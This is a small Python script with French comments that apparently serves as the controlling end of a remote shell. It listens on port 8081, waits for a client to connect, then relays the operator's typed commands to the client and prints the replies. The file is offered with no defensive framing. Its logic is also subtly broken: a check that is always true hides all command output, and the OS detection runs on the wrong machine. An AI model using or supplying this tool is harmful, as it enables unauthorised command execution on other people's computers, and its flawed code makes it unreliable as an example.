import socket
import os
import platform

PORT = 8081
IP = "0.0.0.0"

print(socket.gethostbyname(socket.gethostname()))

print("Server Started !!")


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

s.bind((IP, PORT))

print("Waitng for connexion")

s.listen(5)

client, address = s.accept()
print(f"{address} connected")


#Determine l'os pour adapter les commandes
commands = {"pwd": "pwd", "ls": "ls"}

if platform.platform(terse=True).startswith("Windows"):
    commands = {"pwd": "echo %cd%", "ls": "dir"}


# obtenir le path directory au debut
client.sendall(commands["pwd"].encode())
path_directory = client.recv(1024)
path_directory =  path_directory.decode()

# boucle de commande
while 1:

        text = input(path_directory + " = ")
        if text == "exit":
            break
         
        client.sendall(text.encode())
        
        response = client.recv(1024).decode()
        
        # si la reponse est pour un changement de repertoire
        if response.startswith("") :
            print("YHEAAAAAAAAAAAAAAAAAAAAAAAA")
            path_directory = response
        
        elif response != "":
                print("from client: " + response)
        
        
print("CLOSE")
client.close()